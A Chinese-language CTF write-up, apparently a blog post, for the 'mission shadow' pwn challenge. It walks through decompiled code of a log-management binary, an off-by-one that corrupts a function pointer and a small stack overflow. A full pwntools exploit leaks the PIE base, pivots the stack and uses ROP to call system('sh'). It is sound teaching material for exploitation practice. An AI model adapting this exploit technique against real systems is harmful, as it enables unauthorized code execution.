---
layout: single
title: "mission shadow"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "记录 2026 年 ctf+ 比赛中 mission shadow 题目的分析与解题过程。"
source_folder: "Write-ups/2026/ctf+"
lang: zh-CN
excerpt: "记录 2026 年 ctf+ 比赛中 mission shadow 题目的分析与解题过程。"
---
{% raw %}

# 信息

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

无libc
```

# 反编译

一个非典型日志管理系统。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int idx; // [rsp+8h] [rbp-8h] BYREF
  int v5; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  while ( 1 )
  {
    banner();
    menu();
    idx = 0;
    if ( (unsigned int)_isoc23_scanf("%d", &idx) != 1 )
      break;
    do
      v5 = getchar();
    while ( v5 != 10 && v5 != -1 );
    if ( idx == 4 )
    {
      puts("bye");
      exit(0);
    }
    if ( idx > 4 )
    {
LABEL_16:
      puts("Invalid choice!");
    }
    else
    {
      switch ( idx )
      {
        case 3:
          check_log();
          break;
        case 1:
          create_task();
          break;
        case 2:
          execute_task();
          break;
        default:
          goto LABEL_16;
      }
    }
  }
  puts("bye");
  return 0;
}
```

直接给了pie。

```c
int check_log()
{
  puts("[*] System has been running for: 2319 years");
  puts("[*] Earliest self-examination: 3 years ago");
  return printf("[!] Abnormal data detected: %p\n", &shadow);
}
```

可以创建三种task

```c
int create_task()
{
  int chi; // [rsp+4h] [rbp-Ch] BYREF
  int v2; // [rsp+8h] [rbp-8h]
  unsigned int first_empty; // [rsp+Ch] [rbp-4h]

  first_empty = find_first_empty();
  if ( first_empty == -1 )
    return puts("No available slot!");
  task_menu();
  chi = 0;
  if ( (unsigned int)_isoc23_scanf("%d", &chi) != 1 )
  {
    puts("Input error.");
    exit(0);
  }
  do
    v2 = getchar();
  while ( v2 != 10 && v2 != -1 );
  if ( chi == 3 )
  {
    task[3 * (int)first_empty] = dance;
  }
  else
  {
    if ( chi > 3 )
      return puts("Invalid choice!");
    if ( chi == 1 )
    {
      task[3 * (int)first_empty] = commit_feedback;
    }
    else
    {
      if ( chi != 2 )
        return puts("Invalid choice!");
      task[3 * (int)first_empty] = show_time;
    }
  }
  puts("Annotation (16 bytes):");
  input_annotation(first_empty);
  return puts("[+] Task created.");
}
```

## vuln1

该函数中，

```c
void __fastcall input_annotation(int idx)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 16; ++i )
  {
    *((_BYTE *)&task_list + 0x18 * idx + i) = getchar();
    if ( *((_BYTE *)&task_list + 0x18 * idx + i) == '\n' )
    {
      *((_BYTE *)&task_list + 0x18 * idx + i) = 0;
      return;
    }
  }
}
```

有 off by one 可以覆盖函数指针的最低位，一定程度上控制执行流。

## vuln2
该函数中有，0x8字节的溢出，但缓冲区太短不够布置rop链。

```c
__int64 commit_feedback()
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  init_shadow();
  puts("Please enter your feedback:");
  read(0, buf, 0x18u);
  return shadow_check();
}
```


按顺序执行task，这里不会影响出了 rdx 之外的其他寄存器。

```c
int execute_task()
{
  if ( !(unsigned int)has_any_task() )
    return puts("No task has been created!");
  for ( idx = 0; idx <= 15; ++idx )
  {                                             // 只通过rax，rdx进行遍历执行
    if ( task[3 * idx] )
      ((void (*)(void))task[3 * idx])();
  }
  memset(&task_list, 0, 0x180u);
  return puts("[+] All tasks executed and cleared.");
}
```


# 思路

栈迁移的总体思路为：
1. 布置rop链子
2. 覆盖rbp地址为 rop-8
3. 覆盖后，执行两次`leave ;ret`，控制函数执行rop链

## step1

接收pie

```python
    check()
    ru(b'[!] Abnormal data detected: ')
    p.address = int(rn(14),16) - 0x4200
    look(b'p.address')
```

## step2

进行栈迁移

```python
    # 栈迁移
    create(1,b'a'*0x5 + b'\n')
    create(1,b'a'*0x10 + b'\x41')   # leave ;ret

    # 触发
    execute()
```

## step 3

布置rop链子

```python
   # 布置rop
    sh = 0x4010 + p.address
    rop = 0x4080 + p.address + 2*0x18 + 0x10
    sys = p.address + 0x111d
    create(3,b'a'*0x10+p8(0xb0))    # rdi
    create(2,p64(sh) + p64(sys) + b'\n')
```

# exp

```python
def pwn():
    check()
    ru(b'[!] Abnormal data detected: ')
    p.address = int(rn(14),16) - 0x4200
    look(b'p.address')
    
    # 栈迁移
    create(1,b'a'*0x5 + b'\n')
    create(1,b'a'*0x10 + b'\x41')   # leave ;ret
    
    # 布置rop
    sh = 0x4010 + p.address
    rop = 0x4080 + p.address + 2*0x18 + 0x10
    sys = p.address + 0x111d
    create(3,b'a'*0x10+p8(0xb0))    # rdi
    create(2,p64(sh) + p64(sys) + b'\n')
    
    # 触发
    execute()
    
    sa(b'Please enter your feedback:',b'a'*0x10 + p64(rop - 8))
    
    ia()
```

{% endraw %}
